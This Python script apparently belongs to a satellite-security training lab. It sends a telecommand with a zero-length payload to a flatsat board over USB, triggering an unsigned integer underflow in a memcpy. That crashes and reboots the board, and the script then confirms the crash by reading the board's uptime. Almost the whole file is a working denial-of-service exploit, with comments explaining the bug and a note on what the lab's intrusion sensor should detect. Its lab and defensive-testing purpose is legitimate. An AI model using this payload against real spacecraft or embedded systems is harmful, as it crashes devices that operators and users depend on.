#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 01_fuzzing_crash_usb.py -- BROADCAST_MSG integer underflow, over USB.
#
#     worker.cpp:
#       size_t msg_len = payload_total - 2;      <- unsigned
#       memcpy(buffer_msg, space_packet->data + 2, msg_len);
#
# A payload that decrypts to zero octets makes that subtraction wrap to about
# 4.29 billion, and the memcpy runs. That is the entire exploit.
#
# The crash is in the payload parse, thirty lines before the radio is reached,
# so it behaves identically on the course build with the radio held in reset.
#
# Expected: the board hard-faults and reboots. The CDC port drops and
# re-enumerates a few seconds later, so this script's own connection does not
# survive -- watch the board's text console or PWNSAT-C3 (uptime back to 0).

import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import FlatSat, TC_BROADCAST_MSG, TC_GET_STATUS  # noqa: E402

STATUS_UPTIME_OFFSET = 12       # uint32 LE, see worker.cpp's status packer


def read_uptime(fsat, seq):
    """Seconds since boot, out of STATUS. None if nothing came back."""
    for p in fsat.send(TC_GET_STATUS, b"", seq=seq & 0x3FFF, listen=2.0):
        if p.apid != 0x0C:
            continue
        body = fsat.plaintext(p)
        if len(body) >= STATUS_UPTIME_OFFSET + 4:
            return struct.unpack_from("<I", body, STATUS_UPTIME_OFFSET)[0]
    return None


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--cleartext", action="store_true")
    ap.add_argument("--sweep", action="store_true",
                    help="walk the declared length down instead of one shot")
    args = ap.parse_args()

    print("[*] BROADCAST_MSG with a zero-octet payload.")
    print("[*] msg_len = payload_total - 2 underflows once this decrypts to nothing.")

    def say_refusals(packets, fsat):
        """The board explains a refusal in plain words. Printing it is the
        difference between a closed gate and an apparently broken lab."""
        for p in packets:
            if p.apid == 0x09:
                reason = fsat.plaintext(p).split(b"\x00", 1)[0]
                print(f"[!] the board refused: {reason.decode('ascii', 'replace').strip()}")

    uptime_before = None
    try:
        with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
            uptime_before = read_uptime(fsat, args.seq + 90)
            if uptime_before is not None:
                print(f"[*] uptime before: {uptime_before} s")

            if args.sweep:
                print("\n=== walking the declared length down ===")
                for n, total in enumerate(range(12, -1, -1)):
                    print(f"    declared {total}")
                    say_refusals(
                        fsat.send(TC_BROADCAST_MSG, b"\x00" * max(total, 0),
                                  seq=(args.seq + n) & 0x3FFF, listen=0.4), fsat)
            else:
                say_refusals(
                    fsat.send(TC_BROADCAST_MSG, b"", seq=args.seq, listen=1.0),
                    fsat)
    except Exception as exc:                   # the crash can drop the port mid-write
        print(f"[+] the link died during the send ({type(exc).__name__}). "
              f"That is usually the fault, not an error in this script.")
        return 0

    # Through the Space IDS the attack holds a TCP socket, not the cable, and
    # that socket survives the board rebooting: the sensor loses the port, not
    # this script. So the crash has to be read from the board's own uptime.
    print("\n=== did it reboot? ===")
    try:
        with FlatSat(port=args.port, encrypt=not args.cleartext,
                     verbose=False) as fsat:
            uptime_after = read_uptime(fsat, args.seq + 95)
    except Exception:
        uptime_after = None

    if uptime_before is None or uptime_after is None:
        print("[*] could not read the uptime on both sides. Watch it in "
              "PWNSAT-C3 instead: a reboot takes it back to zero.")
    elif uptime_after < uptime_before:
        print(f"[+] uptime {uptime_before} s -> {uptime_after} s. "
              f"The board hard-faulted and came back. That is the crash.")
    else:
        print(f"[-] uptime {uptime_before} s -> {uptime_after} s, still "
              f"climbing. The board did not fall over.")
        print("[*] Try --sweep. If the link is in its encrypted mode the "
              "payload has to decrypt to nothing, so a cleartext run does "
              "something different.")
    print("\nWhat the sensor should have shown: a declared length that does not "
          "match the frame,\nand a length below the header the application "
          "subtracts from it.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
